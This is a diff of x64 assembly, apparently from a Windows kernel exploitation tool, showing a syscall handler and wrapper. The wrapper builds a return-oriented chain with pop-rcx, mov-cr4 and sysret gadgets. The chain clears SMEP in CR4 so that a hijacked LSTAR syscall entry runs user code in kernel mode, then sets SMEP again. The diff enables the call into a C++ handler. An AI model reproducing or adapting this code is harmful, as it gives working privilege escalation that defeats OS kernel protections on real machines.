@@ -1,6 +1,8 @@
+extern msrexec_handler : proc
+
 .data
 	; offsets into _KPCR/_KPRCB
-	m_kpcr_rsp_offset dq	0h		
+	m_kpcr_rsp_offset  dq	0h		
 	m_kpcr_krsp_offset dq	0h
 	m_system_call dq		0h
 
@@ -25,49 +27,54 @@
 
 .code
 syscall_handler proc
-	cli															; smep is disabled and LSTAR is still not restored at this point...													; we dont want the thread schedular to smoke us...
-	swapgs														; swap gs to kernel gs, and switch to kernel stack...
-	mov gs:m_kpcr_rsp_offset, rsp
-	mov rsp, gs:m_kpcr_krsp_offset
+	swapgs														; swap gs to kernel gs (_KPCR...)
+
+	mov rax, m_kpcr_rsp_offset									; save usermode stack to _KPRCB
+	mov gs:[rax], rsp
+
+	mov rax, m_kpcr_krsp_offset									; load kernel rsp....
+	mov rsp, gs:[rax]
 
 	push rcx													; push RIP
 	push r11													; push EFLAGS
-	mov rcx, r10												; swapped by syscall...
 
+	mov rcx, r10												; swapped by syscall instruction so we switch it back...
 	sub rsp, 020h
-	; call msrexec_handler
+	call msrexec_handler										; call c++ handler (which restores LSTAR and calls lambda...)
 	add rsp, 020h
 
 	pop r11														; pop EFLAGS
 	pop rcx														; pop RIP
-	mov rsp, gs:m_kpcr_rsp_offset								; restore rsp...
-	swapgs
-	sti															; we will be enabling smep in the next return...
-	mov rax, m_smep_on											; cr4 will be set to rax in the next return...
+
+	mov rax, m_kpcr_rsp_offset									; restore rsp back to usermode stack...
+	mov rsp, gs:[rax]											
+
+	swapgs														; swap back to TIB...
 	ret
 syscall_handler endp
 
 syscall_wrapper proc
 	push r10			
-	mov r10, rcx												; rcx contains RIP after syscall instruction is executed...	
-	push m_sysret_gadget										; rop to sysret...
+	mov r10, rcx												
+	push m_sysret_gadget										
 
-	lea rax, finish												; push rip back into rax...
+	lea rax, finish												
 	push rax
 	push m_pop_rcx_gadget
 
-	push m_mov_cr4_gadget										; enable smep...
+	push m_mov_cr4_gadget										
 	push m_smep_on
 	push m_pop_rcx_gadget
 
-	lea rax, syscall_handler									; rop from mov cr4 gadget to syscall handler...
+	lea rax, syscall_handler									
 	push rax
 
-	push m_mov_cr4_gadget										; rop from syscall handler to enable smep again...
-	push m_smep_off												; gets pop'ed into rcx by gadget at LSTAR...
+	push m_mov_cr4_gadget										
+	push m_smep_off												
 	syscall
+
 finish:
-	pop r10	
+	pop r10
 	ret
 syscall_wrapper endp
 end
